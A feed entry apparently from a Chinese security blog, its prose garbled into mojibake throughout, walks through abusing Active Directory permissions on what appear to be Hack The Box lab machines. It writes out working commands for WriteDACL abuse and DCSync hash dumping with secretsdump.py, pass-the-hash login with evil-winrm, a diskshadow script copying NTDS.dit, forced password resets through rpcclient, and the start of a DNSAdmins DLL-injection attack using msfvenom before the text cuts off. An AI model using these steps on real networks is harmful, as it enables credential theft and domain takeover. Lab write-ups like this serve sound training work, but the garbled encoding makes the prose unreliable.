    <title>ÂüüÊ∏óÈÄè‰∏≠ÂèØÊª•Áî®ÊùÉÈôêÂèäÂÖ∂Â∫îÁî®</title>
    <link href="https://www.fomal.cc/posts/32b1aa46.html"/>
    <id>https://www.fomal.cc/posts/32b1aa46.html</id>
    <published>2024-10-16T12:21:52.000Z</published>
    <updated>2024-10-21T07:44:30.719Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>Êª•Áî®writeDACL ÊùÉÈôêÂÆûÁé∞ÊùÉÈôêÊèêÂçá</h1><p>ÁÆÄ‰ªãÔºöÂú®ÂüüÁéØÂ¢É‰∏≠ÔºåÂ¶ÇÊûúÂÆâË£ÖExchangeÂêéÔºåÁ≥ªÁªü‰ºöÊ∑ªÂä†‰∏Ä‰∏™Âêç‰∏∫Microsoft Exchange Security Groups„ÄÅExchange Trusted SubsystemÂíåExchange Windows Permission‰∏â‰∏™ÁªÑ„ÄÇÂ¶ÇÊûúËé∑Âæó‰∫ÜËøô‰∏â‰∏™ÁªÑÂÜÖ‰ªªÊÑèÁî®Êà∑ÁöÑÊéßÂà∂ÊùÉÈôêÔºåÂ∞±ËÉΩÂ§üÁªßÊâøÁî®Êà∑ÁªÑÁöÑWriteDACLÊùÉÈôêÔºåWriteDACLÊùÉÈôêÂèØ‰ª•‰øÆÊîπÂüüÂØπË±°ÁöÑACLÔºåÊúÄÁªàÂÆûÁé∞Âà©Áî®DCSyncÂØºÂá∫ÂüüÂÜÖÊâÄÊúâÁî®Êà∑hashÔºåÂÆûÁé∞ÊùÉÈôêÊèêÂçáÁöÑÁõÆÁöÑ„ÄÇ</p><p><strong>ÂÆûÈôÖÂ∫îÁî®Âú∫ÊôØÔºö</strong></p><p>ÈÄöËøáÂú®BloodHound‰∏≠ÊêúÁ¥¢‚Äúsvc-alfresco‚ÄùÁî®Êà∑ÔºåÊàëÂèëÁé∞ÂÆûÈôÖ‰∏äËØ•Áî®Êà∑Â±û‰∫é Account Operators ÁªÑÔºåËØ•ÁªÑÊòØAD‰∏≠ÁöÑÁâπÊùÉÁªÑ‰πã‰∏ÄÔºåËØ•ÁªÑÁöÑÊàêÂëòÂèØ‰ª•ÂàõÂª∫ÂíåÁÆ°ÁêÜËØ•Âüü‰∏≠ÁöÑÁî®Êà∑ÂíåÁªÑÂπ∂‰∏∫ÂÖ∂ËÆæÁΩÆÊùÉÈôêÔºå‰πüÂèØ‰ª•Âú®Êú¨Âú∞ÁôªÂΩïÂüüÊéßÂà∂Âô®„ÄÇ‰ΩÜÊòØÔºå‰∏çËÉΩÊõ¥ÊîπÂ±û‰∫éAdministratorsÊàñDomain AdminsÁªÑÁöÑË¥¶Âè∑Ôºå‰πü‰∏çËÉΩÊõ¥ÊîπËøô‰∫õÁªÑ„ÄÇ</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476652454-cbd90151-2f5d-44d4-b511-936ce92fa7fd.png" alt="img"></p><p>ÈÄöËøá‰∏ãÂõæÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞‰ªé svc-alfresco Âà∞ Domain Admins ÁöÑË∑ØÂæÑÔºåÊàë‰ª¨Âú®‰∏ãÂõæ‰∏≠ÁöÑÂèëÁé∞exchange windows permissionÁªÑÂÆåÂÖ®‰ø°‰ªªAccount Operators ÁªÑÔºåÂõ†Ê≠§Êàë‰ª¨ÂèØ‰ª•Âà©Áî®Account Operators ÁªÑÁöÑÊùÉÈôêÂàõÂª∫‰∏Ä‰∏™Êñ∞Áî®Êà∑ÔºåÁÑ∂ÂêéÊää‰ªñÊ∑ªÂä†Âà∞exchange windows permissionÁªÑÔºåËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•ÂØπHTB.LOCALËøõË°å‰∏Ä‰∫õÊìç‰Ωú‰∫ÜÔºåÊàë‰ª¨ÁúãÂà∞exchange windows permissionÁªÑÁöÑÊàêÂëòÂØπhtb.localÁî®ÊúâwriteDACLÊùÉÈôêÔºå ÁÑ∂ÂêéÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Êàë‰ª¨Êñ∞Ê∑ªÂä†ÁöÑÁî®Êà∑ÂØπHTB.LOCALÁöÑ writeDACLÊùÉÈôêËøõË°åÊÅ∂ÊÑèÂà©Áî®ÔºåËøõËÄåÂÆûÁé∞ÊùÉÈôêÊèêÂçáÔºå</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476675522-224d3254-95d2-49a7-a15e-6b34a99efc6d.png" alt="img"></p><p>ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåExchange Windows PermissionsÂÆâÂÖ®ÁªÑÂØπÂÆâË£Ö Exchange ÁöÑÂüüÁöÑÂüüÂØπË±°ÂÖ∑Êúâ writeDACL ÊùÉÈôê„ÄÇ</p><p>writeDACL ÊùÉÈôêÂÖÅËÆ∏Ë∫´‰ªΩ‰øÆÊîπÊåáÂÆöÂØπË±°ÁöÑÊùÉÈôêÔºàÊç¢Âè•ËØùËØ¥Ôºö‰øÆÊîπ ACLÔºâÔºåËøôÊÑèÂë≥ÁùÄÈÄöËøáÊàê‰∏∫ÁªÑÁªáÁÆ°ÁêÜÁªÑÁöÑÊàêÂëòÔºåÊàë‰ª¨ËÉΩÂ§üÂ∞ÜÊùÉÈôêÊèêÂçáÂà∞ÂüüÁÆ°ÁêÜÂëòÁöÑÊùÉÈôê„ÄÇ<br>‰∏∫‰∫ÜÂà©Áî®Ëøô‰∏ÄÁÇπÔºåÊàë‰ª¨Â∞ÜÊñ∞ÂàõÂª∫ÁöÑÁî®Êà∑Â∏êÊà∑Ê∑ªÂä†Âà∞ËØ•Exchange Windows PermissionÁªÑ‰∏≠„ÄÇExchange Windows PermissionÁªÑÁöÑÊàêÂëòÔºåËøôÂÖÅËÆ∏Êàë‰ª¨‰øÆÊîπHTB.LOCALÂüüÁöÑ ACL„ÄÇ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user popayw 123abc! /add /domain# ÂàõÂª∫Áî®Êà∑</span><br><span class="line">net group    #ËØ•ÂëΩ‰ª§ÁöÑÁªìÊûú‰∏≠ÊâæÂà∞‰∫ÜExchange Windows PermissionsÁªÑ</span><br><span class="line">net group &quot;Exchange Windows Permissions&quot; popayw /add# Â∞ÜÁî®Êà∑Ê∑ªÂä†Âà∞Exchange Windows PermissionsÁªÑ</span><br><span class="line">net localgroup #Âú®ËØ•ÂëΩ‰ª§ÁöÑÁªìÊûú‰∏≠ÂèëÁé∞‰∫ÜRemote Management UsersÁªÑ</span><br><span class="line">net localgroup &#x27;Remote Management Users&#x27; popayw  /add</span><br></pre></td></tr></table></figure><p>Â¶ÇÊûúÊàë‰ª¨ÊúâÊùÉ‰øÆÊîπ AD ÂØπË±°ÁöÑ ACLÔºåÂàôÂèØ‰ª•Â∞ÜÊùÉÈôêÂàÜÈÖçÁªôÂÖÅËÆ∏‰ªñ‰ª¨ÂÜôÂÖ•ÁâπÂÆöÂ±ûÊÄßÔºà‰æãÂ¶ÇÂåÖÂê´ÁîµËØùÂè∑Á†ÅÁöÑÂ±ûÊÄßÔºâÁöÑË∫´‰ªΩ„ÄÇÈô§‰∫Ü‰∏∫Ëøô‰∫õÂ±ûÊÄßÂàÜÈÖçËØª/ÂÜôÊùÉÈôêÂ§ñÔºåËøòÂèØ‰ª•‰∏∫Êâ©Â±ïÊùÉÈôêÂàÜÈÖçÊùÉÈôê„ÄÇËøô‰∫õÊùÉÈôêÊòØÈ¢ÑÂÆö‰πâÁöÑ‰ªªÂä°Ôºå‰æãÂ¶ÇÊõ¥ÊîπÂØÜÁ†Å„ÄÅÂêëÈÇÆÁÆ±ÂèëÈÄÅÁîµÂ≠êÈÇÆ‰ª∂Á≠âÊùÉÈôê2„ÄÇÈÄöËøáÂ∫îÁî®‰ª•‰∏ãÊâ©Â±ïÊùÉÈôêÔºåËøòÂèØ‰ª•Â∞Ü‰ªª‰ΩïÁªôÂÆöÂ∏êÊà∑Ê∑ªÂä†‰∏∫ÂüüÁöÑÂ§çÂà∂‰ºô‰º¥Ôºö</p><ul><li>Â§çÂà∂ÁõÆÂΩïÊõ¥ÊîπÔºàDS-Replication-Get-ChangesÔºâ</li><li>ÂÖ®ÈÉ®Â§çÂà∂ÁõÆÂΩïÊõ¥Êîπ (DS-Replication-Get-Changes-All )</li></ul><p>ÂΩìÊàë‰ª¨‰∏∫Êàë‰ª¨ÁöÑÁî®Êà∑Â∏êÊà∑ËÆæÁΩÆËøô‰∫õÊùÉÈôêÊó∂ÔºåÊàë‰ª¨ËÉΩÂ§üËØ∑Ê±ÇÂüü‰∏≠‰ªª‰ΩïÁî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏åÔºåÈÇ£‰πàÂÖ∑‰ΩìÂ¶Ç‰ΩïËé∑ÂèñÁöÑÂë¢Ôºü</p><h1><strong>DCsyncÊîªÂáª</strong></h1><ul><li>DCSyncÊîªÂáªÂéüÁêÜ</li></ul><p><strong>‰∏ªË¶ÅÂà©Áî®ÁöÑÊòØÂüüÊéßÂà∂Âô®‰πãÈó¥ÁöÑÊï∞ÊçÆÂêåÊ≠•Â§çÂà∂</strong></p><p>ÂΩì‰∏Ä‰∏™ DC (ÂÆ¢Êà∑Á´Ø DC)ÊÉ≥‰ªéÂÖ∂‰ªñ DC (ÊúçÂä°Á´Ø DC)Ëé∑ÂèñÊï∞ÊçÆÊó∂ÔºåÂÆ¢Êà∑Á´Ø DC ‰ºöÂêëÊúçÂä°Á´Ø DC ÂèëËµ∑‰∏Ä‰∏™ GetNCChanges ËØ∑Ê±Ç„ÄÇÂõûÂ∫îÁöÑÊï∞ÊçÆÂåÖÊã¨ÈúÄË¶ÅÂêåÊ≠•ÁöÑÊï∞ÊçÆ„ÄÇÂ¶ÇÊûúÈúÄË¶ÅÂêåÊ≠•ÁöÑÊï∞ÊçÆÊØîËæÉÂ§öÔºåÂàô‰ºöÈáçÂ§ç‰∏äËø∞ËøáÁ®ã„ÄÇÊØïÁ´üÊØèÊ¨°ÂõûÂ∫îÁöÑÊï∞ÊçÆÊúâÈôê„ÄÇ</p><p>Áî®Êà∑ÊÉ≥Ë¶ÅÂèëËµ∑<code>DCSync</code>ÊîªÂáªÔºåÂøÖÈ°ªËé∑Âæó‰ª•‰∏ã‰ªª‰∏ÄÁî®Êà∑ÁöÑÊùÉÈôê</p><ul><li>AdministratorsÁªÑÂÜÖÁöÑÁî®Êà∑</li><li>Domain AdminsÁªÑÂÜÖÁöÑÁî®Êà∑</li><li>Enterprise AdminsÁªÑÂÜÖÁöÑÁî®Êà∑</li><li>ÂüüÊéßÂà∂Âô®ÁöÑËÆ°ÁÆóÊú∫Â∏êÊà∑</li></ul><p>‰πãÂâçÊàë‰ª¨Â∑≤ÁªèÂàõÂª∫‰∫Ü‰∏Ä‰∏™Êúâ<code>DCSync</code>ÊùÉÈôêÁöÑÁî®Êà∑ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®<code>secretsdump.py</code>Â∑•ÂÖ∑ÊâßË°å <code>DCSync</code> ‰ª•ËΩ¨ÂÇ®ÁÆ°ÁêÜÂëòÁî®Êà∑ÁöÑ <code>NTLM</code> ÂìàÂ∏å</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>secretsdump.py popayw:<span class="string">&#x27;123abc!&#x27;</span>@<span class="number">10.10</span>.<span class="number">10.161</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474277130-8a9b1f9b-9cf6-4513-8c72-d88025f31177.png" alt="img"></p><p>ÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÊãøÂà∞ÊâÄÊúâÁî®Êà∑ÁöÑ<code>hash</code>ÔºåÂåÖÊã¨<code>admin</code>Áî®Êà∑ÁöÑ</p><h1>Êª•Áî®SeBackupPrivilegeÊùÉÈôêËøõË°åNTDS.dtÂç∑ÂΩ±Êã∑Ë¥ùÂÆûÁé∞ÊùÉÈôêÊèêÂçá</h1><p>ÁÆÄ‰ªãÔºöSeBackupPrivilegeÊùÉÈôêÁî®Êù•ÂÆûÁé∞Â§á‰ªΩÊìç‰ΩúÔºåÂÖÅËÆ∏Êñá‰ª∂ÂÜÖÂÆπÊ£ÄÁ¥¢ÔºåÂç≥‰ΩøÊñá‰ª∂‰∏äÁöÑÂÆâÂÖ®ÊèèËø∞Á¨¶ÂèØËÉΩÊú™Êéà‰∫àÊ≠§Á±ªËÆøÈóÆÊùÉÈôê„ÄÇ ÂêØÁî®‰∫Ü SeBackupPrivilege ÁöÑË∞ÉÁî®ÔºåÊñπÊó†ÈúÄ‰ªª‰ΩïÂü∫‰∫é ACL ÁöÑÂÆâÂÖ®Ê£ÄÊü•ÔºåÊàë‰ª¨ÂèØ‰ª•ÂÄüÂä©ËØ•ÊùÉÈôêËøõË°åNTDS.dtÂç∑ÂΩ±Êã∑Ë¥ùÊúÄÁªàÂÆûÁé∞ÊùÉÈôêÊèêÂçá„ÄÇ</p><p><strong>ÂÆûÈôÖÂ∫îÁî®Âú∫ÊôØÔºö</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ÊîªÂáªÁöÑÊ≠•È™§Â§ßÊ¶ÇÂàÜ‰∏âÊ≠•</span><br><span class="line">- Ëé∑ÂèñÊñá‰ª∂ÂâØÊú¨Ôºå`NTDS.dit`Âç≥Â≠òÂÇ® Active Directory Áî®Êà∑Âá≠ÊçÆÁöÑÊï∞ÊçÆÂ∫ì„ÄÇ</span><br><span class="line">- Êé•‰∏ãÊù•ÔºåÊàë‰ª¨Â∞ÜËé∑Âèñ SYSTEM hive Êñá‰ª∂ÔºåÂÖ∂‰∏≠ÂåÖÂê´Ëß£ÂØÜ NTDS.dit ÊâÄÂøÖÈúÄÁöÑÁ≥ªÁªüÂêØÂä®ÂØÜÈí•</span><br><span class="line">- ‰ΩøÁî® Impacket ÁöÑ secretsdump ËÑöÊú¨‰ªé NTDS.dit ‰∏≠ÊèêÂèñÂüü‰∏≠ÊâÄÊúâÁî®Êà∑ÁöÑ NTLM ÂìàÂ∏å</span><br></pre></td></tr></table></figure><p>ÂÅáÂ¶ÇÊàë‰ª¨Áé∞Âú®ÊãøÂà∞‰∫Ü‰∏Ä‰∏™svc_backupÁî®Êà∑ÁöÑhashÔºåÁÑ∂ÂêéÊàë‰ª¨ÂºÄÂßã‰ΩøÁî®evil-winrmÂ∞ùËØïËøõË°åËøúÁ®ãÁôªÂΩï</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</span><br></pre></td></tr></table></figure><p>ÈÄöËøáÊàë‰ª¨‰πãÂâçÂØºÂÖ•ÁöÑbloodhoundÁöÑÂàÜÊûêÁªìÊûúÔºåÊàë‰ª¨ÂæóÁü•ËØ•Áî®Êà∑Â±û‰∫ébackup_operatorsÁªÑÁöÑÊàêÂëò</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474582386-8f350409-cffc-49f0-a6c6-459226ce5b50.png" alt="img"></p><p>Âõ†Ê≠§ËØ•Áî®Êà∑‰πüÂæàÊúâÂèØËÉΩÊòØÂêØÁî®SEBackupPrivilege ÊùÉÈôêÁöÑÁî®Êà∑„ÄÇÊàë‰ª¨ÊâßË°åÂ¶Ç‰∏ãÂëΩ‰ª§ÔºåÁúã‰∏Ä‰∏ãÂÖ∂ÊòØÂê¶ÊúâËØ•ÊùÉÈôê</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474710566-e486b9ce-7659-4bb5-9a5f-7df982f8b3a7.png" alt="img"></p><p>Ê≠§Êó∂Êàë‰ª¨Áü•ÈÅì‰∫ÜÊàë‰ª¨Êã•ÊúâSEBackupPrivilege ÊùÉÈôêÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰ΩøÁî®Á≠æÂêçÁöÑ‰∫åËøõÂà∂Êñá‰ª∂ÂàõÂª∫ NTDS.dit ÁöÑÂç∑ÂΩ±ÂâØÊú¨Êù•ÂÆåÊàêdiskshadow È¶ñÂÖàÔºåÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ cmd.txt ÁöÑÊñáÊú¨Êñá‰ª∂ÔºåÂÖ∂‰∏≠ÂåÖÂê´‰ª•‰∏ãÂÜÖÂÆπÔºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters#</span><br><span class="line">add volume c: alias new1#</span><br><span class="line">set metadata c:\windows\system32\spool\drivers\color\example.cab # Ê∑ªÂä†ÁöÑÈÉ®ÂàÜ</span><br><span class="line">create#</span><br><span class="line">expose %new1% z:#</span><br></pre></td></tr></table></figure><p><a href="https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm">ÂèÇËÄÉÈìæÊé•</a></p><p>ÁÑ∂ÂêéÊâßË°ådiskshadow Âπ∂‰ΩøÁî®ËÑöÊú¨Êñá‰ª∂‰Ωú‰∏∫ÂÖ∂ËæìÂÖ•ÔºåÊé•ÁùÄÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®Ëøô‰∏™<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>Êèê‰æõÁöÑ‰∏§‰∏™<code>dll</code>Êñá‰ª∂ÔºåÂπ∂ÊåâÁÖßÂÖ∂Êèê‰æõÁöÑÊ≠•È™§Êìç‰ΩúÔºåÊù•Â§çÂà∂ÂàõÂª∫ÁöÑ NTDS.dit Âç∑ÂΩ±ÂâØÊú¨<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>Êèê‰æõÁöÑ‰∏§‰∏™<code>dll</code>Êñá‰ª∂ÔºåÂπ∂ÊåâÁÖßÂÖ∂Êèê‰æõÁöÑÊ≠•È™§Êìç‰ΩúÔºåÊù•Â§çÂà∂ÂàõÂª∫ÁöÑ NTDS.dit Âç∑ÂΩ±ÂâØÊú¨</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474999442-6b1f0738-c080-4c36-a78a-7c74126646f5.png" alt="img"></p><p>Â∞ÜÂ§á‰ªΩ<code>ntds.dit</code>Êñá‰ª∂ÁßªÂä®Âà∞ÂΩìÂâçÊñá‰ª∂Â§π</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475051343-dfa3b6e4-ed37-49b2-8a89-7d8b8a56c93f.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475071949-2357f008-5615-4c3e-9359-1fdf1131d018.png" alt="img"></p><p>‰ªéÊ≥®ÂÜåË°®‰∏≠Ëé∑Âèñ<code>system.hive</code>Êñá‰ª∂</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475094698-b226e8d3-c6f3-42b8-b977-2b493b7108fb.png" alt="img"></p><p>‰ΩøÁî®‰ΩøÁî®<code>secretsdump.py</code> Ëß£Êûê <code>NTDS.dit</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475182029-fb8f0bee-8505-40ec-a0b9-03975d9f8a92.png" alt="img"></p><h1>Êª•Áî®ForceChangePasswordÊùÉÈôêÂÆûÁé∞Ê®™ÂêëÁßªÂä®</h1><p>ÁÆÄ‰ªãÔºö ForceChangePassword:Âº∫Âà∂Êõ¥ÊîπÂØÜÁ†Å,Âú®‰∏çÁü•ÈÅìÂΩìÂâçÂØÜÁ†ÅÁöÑÊÉÖÂÜµ‰∏ãÊõ¥ÊîπÁõÆÊ†áÁî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ</p><p><strong>ÂÆûÈôÖÂ∫îÁî®Âú∫ÊôØÔºö</strong></p><p>Êàë‰ª¨Âú®bloodhoundÂèØ‰ª•ÁúãÂà∞supportÁî®Êà∑ÂØπAUDITÁî®Êà∑ÂÖ∑ÊúâForceChangePasswordÊùÉÈôêÔºåÈ°æÂêçÊÄù‰πâÔºåÂ∞±ÊòØ<code>support</code>Áî®Êà∑ÂèØ‰ª•‰øÆÊîπ<code>audit2020</code>Áî®Êà∑ÁöÑÂØÜÁ†Å</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474359846-8e391f96-fd25-4058-85c8-a9d9cb4c62bf.png" alt="img"></p><p>Â∞ùËØïÂà©Áî®<code>rpcclient</code>‰øÆÊîπ<code>audit2020</code>Áî®Êà∑ÁöÑÂØÜÁ†Å</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">rpcclient</span> -<span class="type">U</span> sup<span class="keyword">port</span> <span class="comment">--password=&#x27;#00^BlackKnight&#x27; //10.10.10.192</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410545-68568a43-0b82-47a6-b1a6-b1622f313551.png" alt="img"></p><p>‰øÆÊîπÂØÜÁ†Å</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuseri<span class="symbol">nfo2</span> audit<span class="number">2020</span> <span class="number">23</span> <span class="string">&#x27;test&#x27;</span></span><br></pre></td></tr></table></figure><p>ÂÖ∂‰∏≠<code>23</code>Ë°®Á§∫Áî®Êà∑‰ø°ÊÅØÁ∫ßÂà´‰∏∫ËÆæÁΩÆÁî®Êà∑ÂØÜÁ†ÅÁöÑÁ∫ßÂà´</p><p>ÂΩìËÆæÁΩÆÁöÑÊñ∞ÂØÜÁ†Å‰∏éÂØÜÁ†ÅÁ≠ñÁï•‰∏çÂåπÈÖçÊó∂‰ºöËøîÂõûÔºåËÆæÁΩÆ‰∏Ä‰∏™Â§çÊùÇÂ∫¶ÊØîËæÉÈ´òÁöÑÂØÜÁ†Å</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410762-e611b9c2-f7f9-47cd-97bf-79a2e6529afe.png" alt="img"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuseri<span class="symbol">nfo2</span> audit<span class="number">2020</span> <span class="number">23</span> <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410695-e764bb99-4163-4b61-8096-2adfac47c699.png" alt="img"></p><p>Âà©Áî®<code>crackmapexec</code>È™åËØÅ‰∏Ä‰∏ã</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crackmapexec</span> smb <span class="number">10.10.10.192</span> -u audit2020 -p <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410789-3eeb3d55-f904-497e-920e-ea8f6f2c9a56.png" alt="img"></p><p>Â∞ùËØïÈÄöËøá<code>audit2020</code>Áî®Êà∑ÂéªËé∑ÂæóÊõ¥Â§ö<code>smb</code>ÂÖ±‰∫´ÁõÆÂΩï</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.192</span> -u audit2020 -p <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474459320-bffb8374-1d2d-4a93-829a-585dbbd01e8a.png" alt="img"><br>Áõ∏ÊØî‰∫é‰πãÂâçÁöÑÈÇ£‰∏™Áî®Êà∑ÔºåÊàë‰ª¨Ëé∑Âæó‰∫ÜÁõÆÂΩïforensicÁöÑËÆøÈóÆÊùÉÈôêÔºåÂèØ‰ª•ËøõË°åËøõ‰∏ÄÊ≠•ÁöÑ‰ø°ÊÅØÊêúÈõÜÔºåÊàñËÄÖÂà©Áî®ËØ•Áî®Êà∑ÁöÑÊùÉÈôêÊù•ËøõË°å‰∏Ä‰∫õÂéüÊú¨Êó†Ê≥ïÂÆûÁé∞ÁöÑÊìç‰Ωú„ÄÇ</p><h1>Êª•Áî®DNS AdminÁªÑÊùÉÈôêÂÆûÁé∞ÊùÉÈôêÊèêÂçá</h1><p>ÁÆÄ‰ªãÔºöÂΩìÊàë‰ª¨ÊúâÊùÉËÆøÈóÆÊÅ∞Â•ΩÊòØ DNSAdmins ÁªÑÊàêÂëòÁöÑÁî®Êà∑Â∏êÊà∑Êó∂ÔºåÊàñËÄÖÂΩìÂèóÊÑüÊüìÁöÑÁî®Êà∑Â∏êÊà∑ÂØπ DNS ÊúçÂä°Âô®ÂØπË±°ÂÖ∑ÊúâÂÜôÂÖ•ÊùÉÈôêÊó∂ÔºåÊàë‰ª¨ÂèØ‰ª•Êª•Áî®‰ªñÁöÑÊàêÂëòËµÑÊ†º‰ªéËÄåÂçáÁ∫ß‰∏∫ÁÆ°ÁêÜÂëòÊùÉÈôê„ÄÇÁÆÄÂçïÊù•ËÆ≤ÔºåDNSAdmins ÁªÑÁöÑÊàêÂëòÂèØ‰ª•ËÆøÈóÆÁΩëÁªú DNS ‰ø°ÊÅØ„ÄÇÈªòËÆ§ÊùÉÈôêÂ¶Ç‰∏ãÔºö ÂÖÅËÆ∏ÔºöËØªÂèñ„ÄÅÂÜôÂÖ•„ÄÅÂàõÂª∫ÊâÄÊúâÂ≠êÂØπË±°„ÄÅÂà†Èô§Â≠êÂØπË±°„ÄÅÁâπÊÆäÊùÉÈôê„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåDNSAdmins Ê≤°ÊúâÂêØÂä®ÊàñÂÅúÊ≠¢ DNS ÊúçÂä°ÁöÑËÉΩÂäõÔºå‰ΩÜÁÆ°ÁêÜÂëòÊéà‰∫àËØ•ÁªÑÊàêÂëòËØ•ÊùÉÈôêÂπ∂‰∏çÁΩïËßÅÔºåÂΩìdnsadmins ÁªÑÁöÑÊàêÂëòË¢´Êéà‰∫àËØ•ÊùÉÈôêÊó∂ÂèØÁî®‰∫éÈÄöËøá dll Ê≥®ÂÖ•Â∞ÜÊùÉÈôêÊèêÂçáÂà∞ÁÆ°ÁêÜÂëò„ÄÇ</p><p><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">ÂèÇËÄÉÈìæÊé•</a></p><p><strong>ÂÆûÈôÖÂ∫îÁî®Âú∫ÊôØÔºö</strong></p><p>Êàë‰ª¨ÂèëÁé∞ryanÁî®Êà∑ÊòØDNSAdmins ÁªÑÁöÑÊàêÂëò</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475243149-3c4322d0-7ee2-4757-a692-32e1ce657827.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475252762-af3b7dd7-a0a3-439c-a11e-db618de2dda6.png" alt="img"></p><p>ÂèëÁé∞<code>ryan</code>Áî®Êà∑Â±û‰∫é<code>contractors</code>ÁªÑÔºåËÄå<code>contractors</code>ÁªÑÂèàÂ±û‰∫é<code>dnsadmins</code>ÁªÑÔºåÊâÄ‰ª•<code>ryan</code>Áî®Êà∑Â±û‰∫é<code>dnsadmins</code>ÁªÑ</p><p>Â∞±ÂèØ‰ª•Âà©Áî® <code>DnsAdmins</code>ÊùÉÈôêËøõË°å<code>AD</code>ÂüüÊèêÊùÉ</p><p>Âú®ÁõÆÊ†á‰∏äÔºåÊàë‰ª¨ÂèØ‰ª•Êõ¥Êîπ dns ÁöÑÈÖçÁΩÆÔºåÂõ†‰∏∫Áî®Êà∑ ryan Â±û‰∫édnsadminsÁªÑ„ÄÇÊàë‰ª¨ËøòÂèØ‰ª•ÂêØÂä®ÂíåÂÅúÊ≠¢ dns ÊúçÂä°„ÄÇ</p><p>È¶ñÂÖàÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî® msfvenom ÁîüÊàêÊàë‰ª¨ÁöÑÊúâÊïàË¥üËΩΩ dllÔºåÁÑ∂ÂêéÂêØÂä®smbÊúçÂä°</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475429673-387fa037-6643-4f57-a4b7-9ec4a03c6f46.png" alt="img"></p><p>Âõ†‰∏∫Ê≠£Â∏∏<code>upload</code>‰º†Êñá‰ª∂‰ºöË¢´ÊùÄÊéâÔºåËøôÈáåËÄÉËôë‰ΩøÁî®<code>smb</code>‰º†Êñá‰ª∂</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475452509-72be61e3-8633-403d-b13c-4af30b38242b.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475472509-3bb24eb0-058d-4dd0-a356-b481a1837b7a.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475500613-a48af79f-d61b-4f3f-a486-0fed00f873cd.png" 